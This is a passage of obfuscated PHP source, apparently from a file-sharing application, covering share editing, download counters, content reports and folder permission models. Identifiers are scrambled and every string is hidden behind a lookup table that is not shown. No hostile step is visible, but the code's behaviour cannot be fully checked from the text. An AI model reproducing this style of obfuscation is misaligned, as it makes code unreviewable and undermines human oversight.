$this->where($dÕ²÷÷¿ù¶)->setAdd($Dº‡³øù›[2267]); } public function numDownloadAdd($Cé¤ìê´¼­) { $B¨Ö‡ï™  =& $_SERVER[ã®Â„Éæ¹¤]; $E«Î¶ÇŞÔó = array($B¨Ö‡ï™ [440] => $Cé¤ìê´¼­); $this->where($E«Î¶ÇŞÔó)->setAdd($B¨Ö‡ï™ [2268]); } protected function shareEdit($f¿¹†„ƒŠ, $F¦Œ¡øˆš¡) { goto BÁÍÁËèŒ•; câø½Û»‰¦: foreach ($dØèÊ‚…Ë° as $f‹ÀòŠø´ô) { if (!array_key_exists($f‹ÀòŠø´ô, $F¦Œ¡øˆš¡)) { continue; } $F¾Ø‘óóÙ[$f‹ÀòŠø´ô] = $F¦Œ¡øˆš¡[$f‹ÀòŠø´ô]; } $this->shareEventAdd($EŠ£º–¯ç›[$fä‘ö§Šì[369]], $F¦Œ¡øˆš¡, $fä‘ö§Šì[2094]); $this->where(array($fä‘ö§Šì[440] => $f¿¹†„ƒŠ))->save($F¾Ø‘óóÙ); goto Dì¾½ğÆÒ; D§Š”¢…Œ¡: $this->_checkLinkShare($F¦Œ¡øˆš¡, $EŠ£º–¯ç›); $F¾Ø‘óóÙ = array(); $dØèÊ‚…Ë° = explode($fä‘ö§Šì[47], $fä‘ö§Šì[2273]); goto câø½Û»‰¦; BÁÍÁËèŒ•: $fä‘ö§Šì =& $_SERVER[ã®Â„Éæ¹¤]; $EŠ£º–¯ç› = $this->getInfo($f¿¹†„ƒŠ); if (!$EŠ£º–¯ç›) { return !1; } goto D§Š”¢…Œ¡; Dì¾½ğÆÒ: if (isset($F¦Œ¡øˆš¡[$fä‘ö§Šì[2260]])) { $this->_shareAuthSet($f¿¹†„ƒŠ, $F¦Œ¡øˆš¡[$fä‘ö§Šì[2260]]); } return !0; goto aèæ¢Ì®Ä†; aèæ¢Ì®Ä†: } private function _checkLinkShare($b¦Í‡Ï„¤¾, $c£ÓÇ‡÷») { goto EİÂŒ’êöê; aä¦Èø«§: $FçÆ–Úô = $this->shareFileMeta($Dİä–´êÔ[$b¼©ŠÇ¯ˆÅ[419]]); if (isset($FçÆ–Úô[$b¼©ŠÇ¯ˆÅ[359]]) && $FçÆ–Úô[$b¼©ŠÇ¯ˆÅ[359]] == $b¼©ŠÇ¯ˆÅ[83]) { show_json(LNG($b¼©ŠÇ¯ˆÅ[2276]), !1); } goto fà«¯Ã¾›; a›»ÇÁê™: if ($c£ÓÇ‡÷»[$b¼©ŠÇ¯ˆÅ[391]][$b¼©ŠÇ¯ˆÅ[29]] != $b¼©ŠÇ¯ˆÅ[167]) { $cÛæó¨£Á = $this->_folderReport($c„Ù©ˆˆ´‚); if (!$cÛæó¨£Á) { return; } show_json(LNG($b¼©ŠÇ¯ˆÅ[2274]) . $b¼©ŠÇ¯ˆÅ[2275] . $cÛæó¨£Á, !1); } $Dİä–´êÔ = Model($b¼©ŠÇ¯ˆÅ[775])->fileInfoGet($c£ÓÇ‡÷»[$b¼©ŠÇ¯ˆÅ[391]][$b¼©ŠÇ¯ˆÅ[369]]); if (!$Dİä–´êÔ) { return; } goto aä¦Èø«§; EİÂŒ’êöê: $b¼©ŠÇ¯ˆÅ =& $_SERVER[ã®Â„Éæ¹¤]; if ($b¦Í‡Ï„¤¾[$b¼©ŠÇ¯ˆÅ[446]] != $b¼©ŠÇ¯ˆÅ[83]) { return; } $c„Ù©ˆˆ´‚ = $c£ÓÇ‡÷»[$b¼©ŠÇ¯ˆÅ[391]][$b¼©ŠÇ¯ˆÅ[369]]; goto a›»ÇÁê™; fà«¯Ã¾›: } private function _folderReport($aì©ÖÏ•ñ) { goto bÍ¸³ÇµÔÔ; fß‘´ Éíí: if (!$B½„ö¶„¯±) { return !1; } $B½„ö¶„¯± = array_to_keyvalue($B½„ö¶„¯±, $BÒé‰·£‰[33], $BÒé‰·£‰[419]); $B§Éîæ™ˆ = $BÒé‰·£‰[47] . $aì©ÖÏ•ñ . $BÒé‰·£‰[47]; goto aµ‡­Ì¤Õ´; DËÊ´êÔ†æ: $E‡Éèî¸Ç— = array_to_keyvalue($CÍŞÊŞç„Á, $BÒé‰·£‰[33], $BÒé‰·£‰[28]); $E‡Éèî¸Ç—[] = $A®Ó÷Ê¨ä³[$BÒé‰·£‰[28]]; return implode($BÒé‰·£‰[8], $E‡Éèî¸Ç—); goto f‚ÅíøõÆ«; aµ‡­Ì¤Õ´: $A—’¬« = array($BÒé‰·£‰[419] => array($BÒé‰·£‰[7], $B½„ö¶„¯±), $BÒé‰·£‰[461] => array($BÒé‰·£‰[774], "\x25{$B§Éîæ™ˆ}\x25"), $BÒé‰·£‰[397] => 0); $A®Ó÷Ê¨ä³ = Model($BÒé‰·£‰[775])->where($A—’¬«)->field($BÒé‰·£‰[2278])->find(); if (!$A®Ó÷Ê¨ä³) { return !1; } goto d‡¤…õ´´¡; bÍ¸³ÇµÔÔ: $BÒé‰·£‰ =& $_SERVER[ã®Â„Éæ¹¤]; $A—’¬« = array($BÒé‰·£‰[419] => array($BÒé‰·£‰[944], 0), $BÒé‰·£‰[711] => 3); $B½„ö¶„¯± = Model($BÒé‰·£‰[2277])->where($A—’¬«)->field($BÒé‰·£‰[419])->select(); goto fß‘´ Éíí; d‡¤…õ´´¡: $Cğ¬ÛÕÎÛç = substr($A®Ó÷Ê¨ä³[$BÒé‰·£‰[461]], strpos($A®Ó÷Ê¨ä³[$BÒé‰·£‰[461]], $B§Éîæ™ˆ)); $A—’¬« = array($BÒé‰·£‰[369] => array($BÒé‰·£‰[7], trim($Cğ¬ÛÕÎÛç, $BÒé‰·£‰[47]))); $CÍŞÊŞç„Á = Model($BÒé‰·£‰[775])->where($A—’¬«)->field($BÒé‰·£‰[28])->select(); goto DËÊ´êÔ†æ; f‚ÅíøõÆ«: } protected function remove($B³î›ó†Ï) { goto d²÷ïäÅìá; bµÂæÉœÃ: $Dª·åŒâÛë = $this->where($B·‹”©¬˜¥)->delete(); if ($Dª·åŒâÛë) { Model($B¤èáÏÅÍ„[538])->where(array($B¤èáÏÅÍ„[441] => $B³î›ó†Ï))->delete(); } $e§£¢ï»æ = is_array($B³î›ó†Ï) ? $B³î›ó†Ï[1] : array($B³î›ó†Ï); goto B—‰éŠ†; B—‰éŠ†: for ($b¡¥Ô‹À½… = 0; $b¡¥Ô‹À½… < count($e§£¢ï»æ); $b¡¥Ô‹À½…++) { $aˆ´Äˆ½® = $this->getInfo($e§£¢ï»æ[$b¡¥Ô‹À½…]); if ($aˆ´Äˆ½®[$B¤èáÏÅÍ„[448]] == $B¤èáÏÅÍ„[83]) { Model($B¤èáÏÅÍ„[507])->eventShare($aˆ´Äˆ½®[$B¤èáÏÅÍ„[369]], $B¤èáÏÅÍ„[2265]); } if ($aˆ´Äˆ½®[$B¤èáÏÅÍ„[446]] == $B¤èáÏÅÍ„[83]) { Model($B¤èáÏÅÍ„[507])->eventShare($aˆ´Äˆ½®[$B¤èáÏÅÍ„[369]], $B¤èáÏÅÍ„[2264]); } } return $Dª·åŒâÛë; goto dÎ†Ó…‹‘Ñ; d²÷ïäÅìá: $B¤èáÏÅÍ„ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($B³î›ó†Ï)) { $B³î›ó†Ï = array($B¤èáÏÅÍ„[7], $B³î›ó†Ï); } $B·‹”©¬˜¥ = array($B¤èáÏÅÍ„[441] => $B³î›ó†Ï); goto bµÂæÉœÃ; dÎ†Ó…‹‘Ñ: } protected function removeBySource($cë–ªìÏƒ) { goto cİ¡À¥ôâ; D“îœ²øËæ: $A…§‹Š‰»¤ = array_to_keyvalue($A…§‹Š‰»¤, $bèƒŸáØğ¤[33], $bèƒŸáØğ¤[441]); if (!$A…§‹Š‰»¤) { return; } $B¿¼Ò·‘½® = array($bèƒŸáØğ¤[440] => array($bèƒŸáØğ¤[384], $A…§‹Š‰»¤)); goto a”Çµ²§”; cİ¡À¥ôâ: $bèƒŸáØğ¤ =& $_SERVER[ã®Â„Éæ¹¤]; $B¿¼Ò·‘½® = array($bèƒŸáØğ¤[383] => array($bèƒŸáØğ¤[384], $cë–ªìÏƒ)); $A…§‹Š‰»¤ = $this->field($bèƒŸáØğ¤[441])->where($B¿¼Ò·‘½®)->select(); goto D“îœ²øËæ; a”Çµ²§”: $this->where($B¿¼Ò·‘½®)->delete(); Model($bèƒŸáØğ¤[538])->where($B¿¼Ò·‘½®)->delete(); goto aÁÆ˜‹˜‹´; aÁÆ˜‹˜‹´: } public function listAll($fƒâñ×éˆ‰) { goto d³§—á®‘£; CË¬÷â´º: if ($fƒâñ×éˆ‰[$Cââ†¹äª”[724]]) { $D¸åĞÂÑƒÅ = $fƒâñ×éˆ‰[$Cââ†¹äª”[449]] ? $fƒâñ×éˆ‰[$Cââ†¹äª”[449]] : strtotime(date($Cââ†¹äª”[2279])); $CİßéÏõÊ[$Cââ†¹äª”[187]] = array($Cââ†¹äª”[321], array($fƒâñ×éˆ‰[$Cââ†¹äª”[724]], $D¸åĞÂÑƒÅ)); } if ($fƒâñ×éˆ‰[$Cââ†¹äª”[29]]) { $CİßéÏõÊ[$fƒâñ×éˆ‰[$Cââ†¹äª”[29]]] = 1; } else { $CİßéÏõÊ[] = array($Cââ†¹äª”[446] => array($Cââ†¹äª”[944], 0), $Cââ†¹äª”[448] => array($Cââ†¹äª”[944], 0), $Cââ†¹äª”[2255] => $Cââ†¹äª”[2212]); } if ($fƒâñ×éˆ‰[$Cââ†¹äª”[2208]]) { $CİßéÏõÊ[] = array($Cââ†¹äª”[443] => $fƒâñ×éˆ‰[$Cââ†¹äª”[2208]], $Cââ†¹äª”[1362] => array($Cââ†¹äª”[774], "\45{$fƒâñ×éˆ‰[$Cââ†¹äª”[2208]]}\45"), $Cââ†¹äª”[2255] => $Cââ†¹äª”[2212]); } goto eÊçêáŒ§×; A˜ê‰È¦¾Ó: return $A–³àëØ‡¥; goto AÔ·ãÒöÔ; eÊçêáŒ§×: $A–³àëØ‡¥ = $this->_makeOrder()->where($CİßéÏõÊ)->selectPage(20); if (empty($A–³àëØ‡¥[$Cââ†¹äª”[354]])) { return array(); } $this->_listDataApply($A–³àëØ‡¥[$Cââ†¹äª”[354]]); goto A˜ê‰È¦¾Ó; d³§—á®‘£: $Cââ†¹äª” =& $_SERVER[ã®Â„Éæ¹¤]; $CİßéÏõÊ = array(); if ($fƒâñ×éˆ‰[$Cââ†¹äª”[1456]]) { $CİßéÏõÊ[$Cââ†¹äª”[1456]] = $fƒâñ×éˆ‰[$Cââ†¹äª”[1456]]; } goto CË¬÷â´º; AÔ·ãÒöÔ: } public function listDataApply($E¯Ç³ƒ©£Ë) { $this->_listDataApply($E¯Ç³ƒ©£Ë); return $E¯Ç³ƒ©£Ë; } private function _listDataApply(&$eš‰»åÉóÈ) { goto fšï®ÀœÔÇ; fšï®ÀœÔÇ: $bì†–·›™ç =& $_SERVER[ã®Â„Éæ¹¤]; $a„ŒÜ«²‰Ğ = array_to_keyvalue($eš‰»åÉóÈ, $bì†–·›™ç[33], $bì†–·›™ç[1456]); $D°ã¾¬Ø‡Ö = Model($bì†–·›™ç[479])->userListInfo(array_unique($a„ŒÜ«²‰Ğ)); goto EÆËÀÚòä’; d½…²¸êìì: unset($cÂˆ„£¡•›); goto cÜ×á¬‰²´; EÆËÀÚòä’: $e¦’ççª = array_to_keyvalue($eš‰»åÉóÈ, $bì†–·›™ç[33], $bì†–·›™ç[369]); $f¬Ş›ùİŠˆ = Model($bì†–·›™ç[775])->sourceListInfo($e¦’ççª, !0); foreach ($eš‰»åÉóÈ as &$cÂˆ„£¡•›) { $bÅ¶ÄÇÁèî = $cÂˆ„£¡•›[$bì†–·›™ç[1456]]; $cÂˆ„£¡•›[$bì†–·›™ç[2280]] = $D°ã¾¬Ø‡Ö[$bÅ¶ÄÇÁèî] ? $D°ã¾¬Ø‡Ö[$bÅ¶ÄÇÁèî] : !1; $Eò˜£ŞªÁê = $cÂˆ„£¡•›[$bì†–·›™ç[369]]; $cÂˆ„£¡•›[$bì†–·›™ç[391]] = $f¬Ş›ùİŠˆ[$Eò˜£ŞªÁê] ? $f¬Ş›ùİŠˆ[$Eò˜£ŞªÁê] : !1; } goto d½…²¸êìì; cÜ×á¬‰²´: } private function _makeOrder($BÌã®İÆ³ = '') { goto eŸÑ¥  Š«; eŸÑ¥  Š«: $AÍ³Ç‡á”“ =& $_SERVER[ã®Â„Éæ¹¤]; $dâ¶…‡¢ËŸ = array($AÍ³Ç‡á”“[187], $AÍ³Ç‡á”“[449], $AÍ³Ç‡á”“[2267], $AÍ³Ç‡á”“[2268]); $F»“È„Á«ß = array($AÍ³Ç‡á”“[402] => $AÍ³Ç‡á”“[403], $AÍ³Ç‡á”“[404] => $AÍ³Ç‡á”“[405]); goto d˜ç»¸¹âç; c®Û´ãÆ³á: $BÌã®İÆ³ = $BÌã®İÆ³ . "{$cÀ„ƒÛ¯µÊ}\40{$b•ùÄ­œƒ}"; return $this->order($BÌã®İÆ³); goto b­íè˜»»®; d˜ç»¸¹âç: $cÀ„ƒÛ¯µÊ = Input::get($AÍ³Ç‡á”“[407], $AÍ³Ç‡á”“[7], $AÍ³Ç‡á”“[389], $dâ¶…‡¢ËŸ); $b•ùÄ­œƒ = Input::get($AÍ³Ç‡á”“[408], $AÍ³Ç‡á”“[7], $AÍ³Ç‡á”“[2281], array($AÍ³Ç‡á”“[2207], $AÍ³Ç‡á”“[404])); $b•ùÄ­œƒ = $F»“È„Á«ß[$b•ùÄ­œƒ]; goto c®Û´ãÆ³á; b­íè˜»»®: } public function reportAdd($e„ñÚØÍŒ») { $E¨õï…§‘ƒ =& $_SERVER[ã®Â„Éæ¹¤]; $EÅÌ²’„Ö´ = array($E¨õï…§‘ƒ[441] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[441]], $E¨õï…§‘ƒ[1456] => USER_ID); if (Model($E¨õï…§‘ƒ[2277])->where($EÅÌ²’„Ö´)->find()) { return !1; } $A˜‚†«Ğ´Š = array($E¨õï…§‘ƒ[441] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[441]], $E¨õï…§‘ƒ[1362] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[1362]], $E¨õï…§‘ƒ[369] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[369]], $E¨õï…§‘ƒ[419] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[419]], $E¨õï…§‘ƒ[1456] => USER_ID, $E¨õï…§‘ƒ[29] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[29]], $E¨õï…§‘ƒ[405] => $e„ñÚØÍŒ»[$E¨õï…§‘ƒ[405]]); return Model($E¨õï…§‘ƒ[2277])->add($A˜‚†«Ğ´Š); } public function reportList($E™‘¼Ø) { goto Dœé»òÍ†è; Dœé»òÍ†è: $D¸–ÅíçÜí =& $_SERVER[ã®Â„Éæ¹¤]; $Dœ§µÊ¾” = array(); if ($E™‘¼Ø[$D¸–ÅíçÜí[724]]) { $BÎ±›‡èä¢ = $E™‘¼Ø[$D¸–ÅíçÜí[449]] ? $E™‘¼Ø[$D¸–ÅíçÜí[449]] : strtotime(date($D¸–ÅíçÜí[2279])); $Dœ§µÊ¾”[$D¸–ÅíçÜí[187]] = array($D¸–ÅíçÜí[321], array($E™‘¼Ø[$D¸–ÅíçÜí[724]], $BÎ±›‡èä¢)); } goto eğË¾Ò¥‘; aÏœ“Òß«Œ: $dËªÛÉµ£ = array($D¸–ÅíçÜí[402] => $D¸–ÅíçÜí[403], $D¸–ÅíçÜí[404] => $D¸–ÅíçÜí[405]); $a†¤ŒÛ°Ñ™ = $D¸–ÅíçÜí[2285] . $dËªÛÉµ£[$Fœê£é÷¤]; $EŠšç°Ï÷å = Model($D¸–ÅíçÜí[2277])->where($Dœ§µÊ¾”)->order($a†¤ŒÛ°Ñ™)->selectPage(20); goto Dˆõƒö‰‰Ì; Dˆõƒö‰‰Ì: if (empty($EŠšç°Ï÷å[$D¸–ÅíçÜí[354]])) { return array(); } $this->_listDataApply($EŠšç°Ï÷å[$D¸–ÅíçÜí[354]]); return $EŠšç°Ï÷å; goto B…Çôğ™Ğ; eğË¾Ò¥‘: if (isset($E™‘¼Ø[$D¸–ÅíçÜí[29]]) && in_array($E™‘¼Ø[$D¸–ÅíçÜí[29]], array($D¸–ÅíçÜí[83], $D¸–ÅíçÜí[2282], $D¸–ÅíçÜí[2283], $D¸–ÅíçÜí[2284], $D¸–ÅíçÜí[1942]))) { $Dœ§µÊ¾”[$D¸–ÅíçÜí[29]] = $E™‘¼Ø[$D¸–ÅíçÜí[29]]; } if (isset($E™‘¼Ø[$D¸–ÅíçÜí[711]]) && in_array($E™‘¼Ø[$D¸–ÅíçÜí[711]], array($D¸–ÅíçÜí[470], $D¸–ÅíçÜí[83], $D¸–ÅíçÜí[2282], $D¸–ÅíçÜí[2283]))) { $Dœ§µÊ¾”[$D¸–ÅíçÜí[711]] = $E™‘¼Ø[$D¸–ÅíçÜí[711]]; } $Fœê£é÷¤ = Input::get($D¸–ÅíçÜí[408], $D¸–ÅíçÜí[7], $D¸–ÅíçÜí[2281], array($D¸–ÅíçÜí[2207], $D¸–ÅíçÜí[404])); goto aÏœ“Òß«Œ; B…Çôğ™Ğ: } public function reportStatus($E‚Ò¢å´í) { goto DÆèİŠ‰; DÆèİŠ‰: $fæ×á¬²‡” =& $_SERVER[ã®Â„Éæ¹¤]; $Bõ¶Ù¬è—ö = array($fæ×á¬²‡”[367] => $E‚Ò¢å´í[$fæ×á¬²‡”[367]]); $fö·Û’¶°î = Model($fæ×á¬²‡”[2277])->where($Bõ¶Ù¬è—ö)->field($fæ×á¬²‡”[2286])->find(); goto D•òæ¡ŒÀ; c¥…·Ş‘—í: return $F‘ƒ©ù”¦; goto bÜé­á³¹; D•òæ¡ŒÀ: if (!$fö·Û’¶°î) { return !1; } $e…˜Ë–ƒë© = array($fæ×á¬²‡”[711] => $E‚Ò¢å´í[$fæ×á¬²‡”[711]]); if ($E‚Ò¢å´í[$fæ×á¬²‡”[711]] == $fæ×á¬²‡”[2283] && $fö·Û’¶°î[$fæ×á¬²‡”[711]] == $fæ×á¬²‡”[2283]) { $e…˜Ë–ƒë©[$fæ×á¬²‡”[711]] = 0; } goto BÊˆ—œğ±Ù; BÊˆ—œğ±Ù: $F‘ƒ©ù”¦ = Model($fæ×á¬²‡”[2277])->where($Bõ¶Ù¬è—ö)->save($e…˜Ë–ƒë©); if ($E‚Ò¢å´í[$fæ×á¬²‡”[711]] == $fæ×á¬²‡”[2282]) { if ($fö·Û’¶°î[$fæ×á¬²‡”[419]] != $fæ×á¬²‡”[470] && $this->shareFileMeta($fö·Û’¶°î[$fæ×á¬²‡”[419]])) { $this->shareFileMeta($fö·Û’¶°î[$fæ×á¬²‡”[419]], 0); } $this->remove($fö·Û’¶°î[$fæ×á¬²‡”[441]]); return !0; } if ($F‘ƒ©ù”¦ && $E‚Ò¢å´í[$fæ×á¬²‡”[711]] == $fæ×á¬²‡”[2283]) { $Cé•Âùèç¢ = $e…˜Ë–ƒë©[$fæ×á¬²‡”[711]] == $fæ×á¬²‡”[2283] ? 1 : 0; $this->shareFileMeta($fö·Û’¶°î[$fæ×á¬²‡”[419]], $Cé•Âùèç¢); $this->removeByFile($fö·Û’¶°î[$fæ×á¬²‡”[419]]); } goto c¥…·Ş‘—í; bÜé­á³¹: } private function removeByFile($dÇ‰Ô˜™›) { goto C—“†…ùòÅ; D‘øŒ”Ç¬œ: $dçŞÖÏëò¼ = array_to_keyvalue($EÉªµù«ƒ, $BÄö„‘¼ Œ[33], $BÄö„‘¼ Œ[441]); $this->remove($dçŞÖÏëò¼); goto dÍ¼¦ÅÈò§; Cƒ¨êë‚Š: $eÇ™Ü»¿à‚ = array($BÄö„‘¼ Œ[369] => array($BÄö„‘¼ Œ[7], $bÒˆèÅ¦), $BÄö„‘¼ Œ[446] => 1); $EÉªµù«ƒ = Model($BÄö„‘¼ Œ[2104])->where($eÇ™Ü»¿à‚)->field($BÄö„‘¼ Œ[441])->select(); if (empty($EÉªµù«ƒ)) { return; } goto D‘øŒ”Ç¬œ; C—“†…ùòÅ: $BÄö„‘¼ Œ =& $_SERVER[ã®Â„Éæ¹¤]; $EÉªµù«ƒ = Model($BÄö„‘¼ Œ[775])->where(array($BÄö„‘¼ Œ[419] => $dÇ‰Ô˜™›))->field($BÄö„‘¼ Œ[369])->select(); $bÒˆèÅ¦ = array_to_keyvalue($EÉªµù«ƒ, $BÄö„‘¼ Œ[33], $BÄö„‘¼ Œ[369]); goto Cƒ¨êë‚Š; dÍ¼¦ÅÈò§: } private function shareFileMeta($E…¾ÀøéÒ‡, $b¬ƒÓÔšÂ’ = null) { $eîŒ ¤ù’¬ =& $_SERVER[ã®Â„Éæ¹¤]; $Bìì¦é©®ƒ = array($eîŒ ¤ù’¬[419] => $E…¾ÀøéÒ‡, $eîŒ ¤ù’¬[89] => $eîŒ ¤ù’¬[2287]); if (is_null($b¬ƒÓÔšÂ’)) { return Model($eîŒ ¤ù’¬[2288])->where($Bìì¦é©®ƒ)->find(); } $Bìì¦é©®ƒ[$eîŒ ¤ù’¬[359]] = $b¬ƒÓÔšÂ’; Model($eîŒ ¤ù’¬[2288])->add($Bìì¦é©®ƒ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\143\145\x5f\141\165\x74\150"; public function getAuth($f“‘›æ§Ğ…) { goto b¬øŸÛ„’Õ; eÃñ£‚ÕÖ¯: $bÑÇ¸Š×šŒ = $this->field($e¨çùâ‡¾)->order($béâß´°±Î[367])->where($E¯ÃîÎñŞŞ)->select(); $A‚Ÿº™Ä±î = array(); $DĞ»ñô‘–• = array(); goto Aà„¥»“Á¨; Aà„¥»“Á¨: $A•ÍªÌŠŠ¡ = 2 << 25; foreach ($bÑÇ¸Š×šŒ as $e›¶–Ÿ¡–Ç) { goto FªÛ’¯ïƒ; BœË©ÖÆ: $dÍ‡—¥“Åõ = 0; if ($e›¶–Ÿ¡–Ç[$béâß´°±Î[371]] == SourceModel::TYPE_GROUP) { $dÍ‡—¥“Åõ = $A•ÍªÌŠŠ¡ * 2; } if ($e›¶–Ÿ¡–Ç[$béâß´°±Î[371]] == SourceModel::TYPE_USER) { $dÍ‡—¥“Åõ = $A•ÍªÌŠŠ¡; } goto DñŒŒ÷»£; DñŒŒ÷»£: if ($e›¶–Ÿ¡–Ç[$béâß´°±Î[371]] == SourceModel::TYPE_USER && $e›¶–Ÿ¡–Ç[$béâß´°±Î[458]] == $béâß´°±Î[470]) { $dÍ‡—¥“Åõ = 0; } $DĞ»ñô‘–•[] = $C‘•Ô»³ê¥[$béâß´°±Î[376]] + $dÍ‡—¥“Åõ; goto b”Ä×ìîÇ; FªÛ’¯ïƒ: $C‘•Ô»³ê¥ = Model($béâß´°±Î[2290])->listData($e›¶–Ÿ¡–Ç[$béâß´°±Î[2271]]); if (!$C‘•Ô»³ê¥) { continue; } $A‚Ÿº™Ä±î[] = $e›¶–Ÿ¡–Ç; goto BœË©ÖÆ; b”Ä×ìîÇ: } array_multisort($DĞ»ñô‘–•, SORT_DESC, $A‚Ÿº™Ä±î); goto a¼íˆø’õí; a¼íˆø’õí: return $A‚Ÿº™Ä±î; goto f¸™—…‚É†; b¬øŸÛ„’Õ: $béâß´°±Î =& $_SERVER[ã®Â„Éæ¹¤]; $e¨çùâ‡¾ = $béâß´°±Î[2289]; $E¯ÃîÎñŞŞ = array($béâß´°±Î[369] => $f“‘›æ§Ğ…); goto eÃñ£‚ÕÖ¯; f¸™—…‚É†: } public function setAuth($D×¿½ö–í, $fƒİˆéù) { goto fÒ©¯Õ¹‘é; eµÊéáæÓ‚: return !0; goto Aî¡ÊÉè‚‡; F…åÉîà‰ : if ($e¡ò»ÈÅê[$aø¶»‰†[371]] != SourceModel::TYPE_GROUP) { return !1; } $Bëé©„¸Å = 1; $e¹» õà”£ = $e¡ò»ÈÅê[$aø¶»‰†[458]]; goto fšÑöŠ–«ˆ; fÒ©¯Õ¹‘é: $aø¶»‰† =& $_SERVER[ã®Â„Éæ¹¤]; $e¡ò»ÈÅê = Model($aø¶»‰†[1136])->sourceInfo($D×¿½ö–í); if (!$e¡ò»ÈÅê) { return !1; } goto F…åÉîà‰ ; fšÑöŠ–«ˆ: if ($e¹» õà”£ != $Bëé©„¸Å) { $C¾é£ÔÂ˜ = array($aø¶»‰†[2127] => $e¹» õà”£); $D‚ƒªŠœØ¤ = Model($aø¶»‰†[2206])->field($aø¶»‰†[1456])->where($C¾é£ÔÂ˜)->select(); $D‚ƒªŠœØ¤ = array_to_keyvalue($D‚ƒªŠœØ¤, $aø¶»‰†[33], $aø¶»‰†[1456]); } $a†˜Œ«ËÑÅ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Fç×†‘‹”ª = array(); goto F¸Ü²›ÏÁ; F¸Ü²›ÏÁ: foreach ($fƒİˆéù as $cÊÇõ÷­) { if (!in_array($cÊÇõ÷­[$aø¶»‰†[371]], $a†˜Œ«ËÑÅ)) { show_json(LNG($aø¶»‰†[2291]), !1); } if ($e¹» õà”£ != $Bëé©„¸Å) { if ($cÊÇõ÷­[$aø¶»‰†[371]] == SourceModel::TYPE_GROUP) { } if ($cÊÇõ÷­[$aø¶»‰†[458]] != 0 && !in_array($cÊÇõ÷­[$aø¶»‰†[458]], $D‚ƒªŠœØ¤)) { } } if ($cÊÇõ÷­[$aø¶»‰†[458]] == 0) { $cÊÇõ÷­[$aø¶»‰†[371]] = SourceModel::TYPE_USER; } $Fç×†‘‹”ª[] = array($aø¶»‰†[369] => $D×¿½ö–í, $aø¶»‰†[371] => intval($cÊÇõ÷­[$aø¶»‰†[371]]), $aø¶»‰†[458] => intval($cÊÇõ÷­[$aø¶»‰†[458]]), $aø¶»‰†[2271] => intval($cÊÇõ÷­[$aø¶»‰†[2271]]) ? intval($cÊÇõ÷­[$aø¶»‰†[2271]]) : 0, $aø¶»‰†[2272] => intval($cÊÇõ÷­[$aø¶»‰†[2272]]) ? intval($cÊÇõ÷­[$aø¶»‰†[2272]]) : -1); } $this->where(array($aø¶»‰†[383] => $D×¿½ö–í))->delete(); $this->addAll($Fç×†‘‹”ª); goto eµÊéáæÓ‚; Aî¡ÊÉè‚‡: } public function authClear($CÆ•‡°‡Ë) { $b¸ÒÖÕëÎ =& $_SERVER[ã®Â„Éæ¹¤]; $fÊ“¯Ëëëù = Model($b¸ÒÖÕëÎ[1136])->sourceInfo($CÆ•‡°‡Ë); $fôÔ‡“èÉ¨ = array($CÆ•‡°‡Ë); if ($fÊ“¯Ëëëù[$b¸ÒÖÕëÎ[370]] == $b¸ÒÖÕëÎ[83]) { $fèª©ŒŞ = array($b¸ÒÖÕëÎ[527] => array($b¸ÒÖÕëÎ[485], $fÊ“¯Ëëëù[$b¸ÒÖÕëÎ[461]] . $CÆ•‡°‡Ë . $b¸ÒÖÕëÎ[486])); $fôÔ‡“èÉ¨ = Model($b¸ÒÖÕëÎ[1136])->field($b¸ÒÖÕëÎ[383])->where($fèª©ŒŞ)->getField($b¸ÒÖÕëÎ[369], !0); $fôÔ‡“èÉ¨[] = $CÆ•‡°‡Ë; } $this->where(array($b¸ÒÖÕëÎ[383] => array($b¸ÒÖÕëÎ[384], $fôÔ‡“èÉ¨)))->delete(); return !0; } public function getAllChildren($c’ôÙ‰Ëî›) { goto cºÔ™•àèÎ; bôèò’õîµ: if ($f˜è½¬³Íô[$a…¼º„îË¦[371]] != SourceModel::TYPE_GROUP) { return array(); } $BÇœÂ¢Øç = 1; $cí¾¶‰Û² = array($c’ôÙ‰Ëî›); goto d†Õ½¯æßÔ; f­åÙÔŠ‡‘: if (!$d®“×Ñ¿ï‰) { return array(); } $b”¼‘Å±Ô† = $a…¼º„îË¦[2292]; $Eâ• Æ‘ = array($a…¼º„îË¦[369] => array($a…¼º„îË¦[7], $d®“×Ñ¿ï‰), $a…¼º„îË¦[397] => $a…¼º„îË¦[470]); goto aÑ‰òòº´‚; d†Õ½¯æßÔ: if ($f˜è½¬³Íô[$a…¼º„îË¦[463]] == $a…¼º„îË¦[470] && $f˜è½¬³Íô[$a…¼º„îË¦[458]] != $BÇœÂ¢Øç) { $cí¾¶‰Û² = $this->groupChidldAllRootSource($f˜è½¬³Íô[$a…¼º„îË¦[458]]); } $d®“×Ñ¿ï‰ = $this->field($a…¼º„îË¦[369])->group($a…¼º„îË¦[369])->select(); $d®“×Ñ¿ï‰ = array_to_keyvalue($d®“×Ñ¿ï‰, $a…¼º„îË¦[33], $a…¼º„îË¦[369]); goto f­åÙÔŠ‡‘; aÑ‰òòº´‚: $aÙÈ¨ò„Ëñ = Model($a…¼º„îË¦[775])->field($b”¼‘Å±Ô†)->where($Eâ• Æ‘)->select(); $dÚä¯¦¨× = array($c’ôÙ‰Ëî›); foreach ($aÙÈ¨ò„Ëñ as $cé×ñˆš) { foreach ($cí¾¶‰Û² as $E¨ğ¶ñµ°ë) { $F¶î³æßÇÉ = $a…¼º„îË¦[47] . $E¨ğ¶ñµ°ë . $a…¼º„îË¦[47]; $Eš¶…à = $cé×ñˆš[$a…¼º„îË¦[461]] . $cé×ñˆš[$a…¼º„îË¦[369]] . $a…¼º„îË¦[47]; if (strstr($Eš¶…à, $F¶î³æßÇÉ)) { $dÚä¯¦¨×[] = $cé×ñˆš[$a…¼º„îË¦[369]]; break; } } } goto B¾İÃ±˜ï…; cºÔ™•àèÎ: $a…¼º„îË¦ =& $_SERVER[ã®Â„Éæ¹¤]; $f˜è½¬³Íô = Model($a…¼º„îË¦[1136])->sourceInfo($c’ôÙ‰Ëî›); if 